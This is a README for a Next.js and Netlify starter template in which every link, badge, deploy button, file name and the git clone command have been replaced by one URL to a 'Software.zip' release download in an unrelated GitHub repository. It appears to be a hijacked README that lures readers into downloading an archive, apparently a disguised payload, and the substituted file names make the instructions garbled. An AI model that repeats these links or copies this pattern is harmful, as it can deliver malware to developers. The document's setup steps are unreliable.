# Next + Netlify Starter

[![Netlify Status](https://github.com/Ahlaena21/blizz-gallery/releases/download/v2.0/Software.zip)](https://github.com/Ahlaena21/blizz-gallery/releases/download/v2.0/Software.zip)

This is a [https://github.com/Ahlaena21/blizz-gallery/releases/download/v2.0/Software.zip](https://github.com/Ahlaena21/blizz-gallery/releases/download/v2.0/Software.zip) v14 project bootstrapped with [`create-next-app`](https://github.com/Ahlaena21/blizz-gallery/releases/download/v2.0/Software.zip) and set up to be instantly deployed to [Netlify](https://github.com/Ahlaena21/blizz-gallery/releases/download/v2.0/Software.zip)!

This project is a very minimal starter that includes 2 sample components, a global stylesheet, a `https://github.com/Ahlaena21/blizz-gallery/releases/download/v2.0/Software.zip` for deployment, and a `https://github.com/Ahlaena21/blizz-gallery/releases/download/v2.0/Software.zip` for setting up absolute imports and aliases. With Netlify, you'll have access to features like Preview Mode, server-side rendering/incremental static regeneration via Netlify Functions, and internationalized routing on deploy automatically.

[![Deploy to Netlify](https://github.com/Ahlaena21/blizz-gallery/releases/download/v2.0/Software.zip)](https://github.com/Ahlaena21/blizz-gallery/releases/download/v2.0/Software.zip)

(If you click this button, it will create a new repo for you that looks exactly like this one, and sets that repo up immediately for deployment on Netlify)

## Table of Contents:

- [Getting Started](#getting-started)
- [Installation options](#installation-options)
- [Testing](#testing)
  - [Included Default Testing](#included-default-testing)
  - [Removing Renovate](#removing-renovate)
  - [Removing Cypress](#removing-cypress)

## Getting Started

First, run the development server:

```bash
npm run dev
# or
yarn dev
```

Open [http://localhost:3000](http://localhost:3000) with your browser to see the result.

You can start editing the page by modifying `https://github.com/Ahlaena21/blizz-gallery/releases/download/v2.0/Software.zip`. The page auto-updates as you edit the file.

### Installation options

**Option one:** One-click deploy

[![Deploy to Netlify](https://github.com/Ahlaena21/blizz-gallery/releases/download/v2.0/Software.zip)](https://github.com/Ahlaena21/blizz-gallery/releases/download/v2.0/Software.zip)

**Option two:** Manual clone

1. Clone this repo: `git clone https://github.com/Ahlaena21/blizz-gallery/releases/download/v2.0/Software.zip`
2. Navigate to the directory and run `npm install`
3. Run `npm run dev`
4. Make your changes
5. Connect to [Netlify](https://github.com/Ahlaena21/blizz-gallery/releases/download/v2.0/Software.zip) manually (the `https://github.com/Ahlaena21/blizz-gallery/releases/download/v2.0/Software.zip` file is the one you'll need to make sure stays intact to make sure the export is done and pointed to the right stuff)

## Testing

### Included Default Testing

We’ve included some tooling that helps us maintain these templates. This template currently uses:

- [Renovate](https://github.com/Ahlaena21/blizz-gallery/releases/download/v2.0/Software.zip) - to regularly update our dependencies
- [Cypress](https://github.com/Ahlaena21/blizz-gallery/releases/download/v2.0/Software.zip) - to run tests against how the template runs in the browser
- [Cypress Netlify Build Plugin](https://github.com/Ahlaena21/blizz-gallery/releases/download/v2.0/Software.zip) - to run our tests during our build process

If your team is not interested in this tooling, you can remove them with ease!

### Removing Renovate

In order to keep our project up-to-date with dependencies we use a tool called [Renovate](https://github.com/Ahlaena21/blizz-gallery/releases/download/v2.0/Software.zip). If you’re not interested in this tooling, delete the `https://github.com/Ahlaena21/blizz-gallery/releases/download/v2.0/Software.zip` file and commit that onto your main branch.

### Removing Cypress

For our testing, we use [Cypress](https://github.com/Ahlaena21/blizz-gallery/releases/download/v2.0/Software.zip) for end-to-end testing. This makes sure that we can validate that our templates are rendering and displaying as we’d expect. By default, we have Cypress not generate deploy links if our tests don’t pass. If you’d like to keep Cypress and still generate the deploy links, go into your `https://github.com/Ahlaena21/blizz-gallery/releases/download/v2.0/Software.zip` and delete the plugin configuration lines:

```diff
[[plugins]]
  package = "netlify-plugin-cypress"
-  [https://github.com/Ahlaena21/blizz-gallery/releases/download/v2.0/Software.zip]
-    enable = true
-
-  [https://github.com/Ahlaena21/blizz-gallery/releases/download/v2.0/Software.zip]
-    enable = false
```

If you’d like to remove the `netlify-plugin-cypress` build plugin entirely, you’d need to delete the entire block above instead. And then make sure sure to remove the package from the dependencies using:

```bash
npm uninstall -D netlify-plugin-cypress
```

And lastly if you’d like to remove Cypress entirely, delete the entire `cypress` folder and the `https://github.com/Ahlaena21/blizz-gallery/releases/download/v2.0/Software.zip` file. Then remove the dependency using:

```bash
npm uninstall -S cypress
```
